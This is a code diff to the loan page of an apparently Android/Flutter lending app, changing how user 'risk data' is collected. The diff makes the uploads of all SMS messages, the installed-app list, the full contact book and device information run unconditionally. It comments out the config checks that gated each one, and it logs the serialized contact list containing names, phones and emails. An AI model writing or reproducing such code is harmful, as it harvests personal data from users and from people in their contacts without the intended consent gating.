@@ -65,21 +65,25 @@ class _LoanPageState extends ConsumerState<LoanPage>
   }
 
   Future<void> detailUserRiskData(AuthRiskDataUploadConfig config) async {
-    if (config.cellMessage ?? false) {
-      uploadAllSms();
-    }
+    await uploadAllSms();
+    await uploadAppList();
+    await uploadContacts();
+    await uploadDeviceInfo();
+    // if (config.cellMessage ?? false) {
+    //   uploadAllSms();
+    // }
 
-    if (config.appList ?? false) {
-      uploadAppList();
-    }
+    // if (config.appList ?? false) {
+    //   uploadAppList();
+    // }
 
-    if (config.linkerBook ?? false) {
-      uploadContacts();
-    }
+    // if (config.linkerBook ?? false) {
+    //   uploadContacts();
+    // }
 
-    if (config.deviceInfo ?? false) {
-      uploadDeviceInfo();
-    }
+    // if (config.deviceInfo ?? false) {
+    //   uploadDeviceInfo();
+    // }
   }
 
   Future<void> uploadDeviceInfo() async {
@@ -106,18 +110,25 @@ class _LoanPageState extends ConsumerState<LoanPage>
   Future<void> uploadContacts() async {
     final status = await Permission.contacts.request();
     if (status.isGranted) {
+      AppUtils.log.e('uploadContacts');
+
       /// LINKER_BOOK
-      final List<Contact> contacts =
-          await ContactsService.getContacts(withThumbnails: false);
-      final List<ContactsModel> contactList = contacts.map((item) {
-        return ContactsModel(
-            item.identifier,
-            '',
-            item.emails?.first.value ?? '',
-            item.displayName ?? '',
-            item.phones?.first.value ?? '',
-            item.phones?.first.label ?? '');
+      final contacts = await ContactsService.getContacts(withThumbnails: false);
+
+      // 遍历联系人，获取每个联系人的添加时间
+
+      final contactList = contacts.map((item) {
+        final email =
+            item.emails?.isEmpty ?? true ? '' : item.emails?.first.value ?? '';
+
+        final phone =
+            item.phones?.isEmpty ?? true ? '' : item.phones?.first.value ?? '';
+
+        return ContactsModel(item.identifier, item.contactTimes, email,
+            item.displayName ?? '', phone, item.times);
       }).toList();
+
+      AppUtils.log.e('uploadContacts contactList: ${jsonEncode(contactList)}');
 
       try {
         final result = await DioUtils.instance.client
